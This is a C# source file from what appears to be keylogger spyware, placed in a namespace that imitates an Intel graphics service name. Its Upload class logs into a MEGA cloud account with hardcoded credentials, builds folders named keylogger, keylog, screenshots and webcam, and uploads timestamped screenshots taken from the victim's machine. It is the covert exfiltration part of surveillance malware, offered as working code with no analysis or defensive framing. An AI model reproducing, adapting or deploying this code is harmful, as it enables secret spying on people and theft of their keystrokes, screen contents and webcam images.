using CG.Web.MegaApiClient;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace igfxCUIService
{
    class Upload
    {
        #region variable
        private static MegaApiClient client = new MegaApiClient();
        private static INode root;
        private static INode keylogger;
        private static INode keylog;
        private static INode screenshots;
        private static INode webcam;
        private static INode Sendfile;
        #endregion

        public static void Uploadfile()
        {
            client.Login("dippernetwork@gmail.com", "igfxCUIService");
            var nodes = client.GetNodes();
            root = nodes.Single(n => n.Type == NodeType.Root);

            maps();

            Sendfile = client.UploadFile(Screenshots.pathString + Screenshots.hour + "." + Screenshots.minuten + "." + Screenshots.seconde + ".jpeg", screenshots);

            //Uri downloadUrl = client.GetDownloadLink(Sendfile);
            //Console.WriteLine(downloadUrl);

            //Console.ReadLine();
            client.Logout();
        }

        private static void maps()
        {
            var nodes = client.GetNodes();
            try
            {
                keylogger = client.GetNodes(root).Single(n => n.Name == "keylogger");
            }
            catch
            {
                keylogger = client.CreateFolder("keylogger", root);
            }
            // keylog
            try
            {
                INode keylog = client.GetNodes(keylogger).Single(n => n.Name == "keylog");
            }
            catch
            {
                keylog = client.CreateFolder("keylog", keylogger);
            }
            // screenshots
            try
            {
                screenshots = client.GetNodes(keylogger).Single(n => n.Name == "screenshots");
            }
            catch
            {
                screenshots = client.CreateFolder("screenshots", keylogger);
            }
            // webcam
            try
            {
                webcam = client.GetNodes(keylogger).Single(n => n.Name == "webcam");
            }
            catch
            {
                webcam = client.CreateFolder("webcam", keylogger);
            }
        }
    }
}